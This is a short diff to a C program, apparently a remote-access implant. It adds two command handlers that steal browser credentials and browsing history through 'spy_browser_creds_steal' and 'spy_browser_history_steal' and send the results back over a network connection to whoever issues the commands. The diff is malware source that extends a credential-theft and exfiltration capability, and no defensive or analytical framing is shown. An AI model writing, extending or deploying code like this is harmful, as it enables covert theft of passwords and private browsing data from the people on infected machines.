@@ -596,6 +596,36 @@ int main(int argc, char **argv)
             break;
         }
 
+        case COMMAND_CRED_STEAL: {
+            int len = 0;
+            char *data = spy_browser_creds_steal(&len);
+            if (data) {
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
+                locked_send(&resp, conn);
+                free(data);
+            } else {
+                char *err = "credential steal failed (not found or access denied)";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+            break;
+        }
+
+        case COMMAND_HISTORY_STEAL: {
+            int len = 0;
+            char *data = spy_browser_history_steal(&len);
+            if (data) {
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
+                locked_send(&resp, conn);
+                free(data);
+            } else {
+                char *err = "history steal failed (not found or access denied)";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+            break;
+        }
+
         default:
             break;
         }
